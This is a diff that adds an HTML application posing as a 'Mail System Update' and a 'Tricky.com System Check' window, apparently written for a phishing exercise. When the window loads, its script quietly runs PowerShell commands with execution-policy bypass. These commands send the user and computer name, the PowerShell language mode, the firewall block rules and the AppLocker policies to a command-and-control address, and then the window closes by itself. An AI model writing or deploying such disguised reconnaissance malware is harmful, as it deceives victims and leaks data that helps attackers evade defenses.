@@ -1,0 +1,60 @@
+<html>
+<head>
+<title>Mail System Update</title>
+<hta:application
+    id="oHTA"
+    applicationname="InfoCollector"
+    border="thin"
+    borderstyle="normal"
+    caption="yes"
+    contextmenu="no"
+    innerborder="no"
+    maximizebutton="no"
+    minimizebutton="no"
+    navigable="no"
+    scroll="no"
+    showintaskbar="no"
+    singleinstance="yes"
+    sysmenu="no"
+    windowstate="normal"
+/>
+<script language="JScript">
+var C2 = "http://192.168.45.220";
+
+function runHidden(cmd) {
+    try {
+        new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
+    } catch(e) {}
+}
+
+function collectInfo() {
+    // 1. 用户身份（修复：使用 $env:USERNAME 获取纯用户名）
+    runHidden('powershell -exec bypass -nop -c "$u=$env:USERNAME+\'@\'+$env:COMPUTERNAME;iwr ' + C2 + '/user/$u -useb"');
+
+    // 2. PowerShell 语言模式
+    runHidden('powershell -exec bypass -nop -c "$m=$ExecutionContext.SessionState.LanguageMode;iwr ' + C2 + '/psmode/$m -useb"');
+
+    // 3. 防火墙阻止规则
+    runHidden('powershell -exec bypass -nop -c "Get-NetFirewallRule -PolicyStore ActiveStore | where {$_.Action -eq \'Block\'} | foreach {$n=$_.DisplayName -replace \' \',\'+\'; iwr ' + C2 + '/fwblock/$n -useb}"');
+
+    // 4. AppLocker 策略
+    runHidden('powershell -exec bypass -nop -c "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | foreach {$n=$_.Name -replace \' \',\'+\'; iwr ' + C2 + '/applocker/$n -useb}"');
+}
+
+window.onload = function() {
+    document.getElementById("status").innerText = "Checking system, please wait...";
+    collectInfo();
+    window.setTimeout(function() {
+        window.close();
+    }, 4000);
+};
+</script>
+</head>
+<body style="font-family:Calibri; background:#f0f0f0;">
+<div style="margin:80px auto; width:320px; padding:20px; background:white; border:1px solid #ccc; text-align:center;">
+    <h3>Tricky.com System Check</h3>
+    <p id="status">Please wait...</p>
+    <p><small>This window will close automatically.</small></p>
+</div>
+</body>
+</html>
